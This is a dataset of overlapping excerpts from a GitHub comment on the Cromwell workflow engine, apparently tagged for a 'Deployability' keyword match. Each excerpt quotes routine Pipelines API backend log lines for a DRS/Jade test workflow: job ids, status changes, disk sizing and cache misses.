https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:3813,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,3813,"PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/6169035039702064455; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:4117,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,4117,"-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/6169035039702064455; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:4429,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,4429,"-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/6169035039702064455; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18:59:03,708 cromwell-system-akka.dispatchers.backend-dispatcher-96 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncB",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:4695,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,4695,"rt images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/6169035039702064455; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18:59:03,708 cromwell-system-akka.dispatchers.backend-dispatcher-96 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)d",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:4956,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,4956,"(user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/6169035039702064455; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18:59:03,708 cromwell-system-akka.dispatchers.backend-dispatcher-96 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 19:01:18,073 cromwell-system-akka.dispatchers.backend-dispatcher-130 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:5210,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,5210,"oot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/6169035039702064455; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18:59:03,708 cromwell-system-akka.dispatchers.backend-dispatcher-96 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 19:01:18,073 cromwell-system-akka.dispatchers.backend-dispatcher-130 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from Running to Success; 2020-10-13 19:02:03,961 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:5431,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,5431,"ndJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/6169035039702064455; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18:59:03,708 cromwell-system-akka.dispatchers.backend-dispatcher-96 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 19:01:18,073 cromwell-system-akka.dispatchers.backend-dispatcher-130 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from Running to Success; 2020-10-13 19:02:03,961 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa; 2020-10-13 19:03:01,200 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - WorkflowExecutionActor-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:5657,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,5657,"patcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18:59:03,708 cromwell-system-akka.dispatchers.backend-dispatcher-96 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 19:01:18,073 cromwell-system-akka.dispatchers.backend-dispatcher-130 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from Running to Success; 2020-10-13 19:02:03,961 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa; 2020-10-13 19:03:01,200 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.d",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:5871,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,5871,"415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 18:59:03,708 cromwell-system-akka.dispatchers.backend-dispatcher-96 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 18:59:03,760 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Running; 2020-10-13 19:01:18,073 cromwell-system-akka.dispatchers.backend-dispatcher-130 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Status change from Running to Success; 2020-10-13 19:02:03,961 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa; 2020-10-13 19:03:01,200 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Restarting drs_usa_jdr.skip_localize_jdr_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.read_drs_with_usa; 2020-10-13 19:03:02,934 cromwell-system-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatte",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7646,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,7646,"stem-akka.dispatchers.engine-dispatcher-31 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Job results retrieved (FetchedFromJobStore): 'drs_usa_jdr.skip_localize_jdr_drs_with_usa' (scatter index: None, attempt 1); 2020-10-13 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:42,570 cromwell-system-akka.dispatchers.backend-dispatcher-40 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.r",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:7907,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,7907,"3 19:03:03,392 cromwell-system-akka.dispatchers.engine-dispatcher-34 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:42,570 cromwell-system-akka.dispatchers.backend-dispatcher-40 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 19:03:42,897 cromwell-system-akka.dispatchers.backend-dispatcher-140 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Un",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:8161,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,8161,"_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:03,667 cromwell-system-akka.dispatchers.engine-dispatcher-30 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 19:03:06,298 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/3237339977528305328; 2020-10-13 19:03:06,299 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: job id: projects/broad-dsde-cromwell-dev/operations/15450562168035605133; 2020-10-13 19:03:40,191 cromwell-system-akka.dispatchers.backend-dispatcher-41 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:40,200 cromwell-system-akka.dispatchers.backend-dispatcher-109 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Status change from - to Success; 2020-10-13 19:03:42,570 cromwell-system-akka.dispatchers.backend-dispatcher-40 WARN - 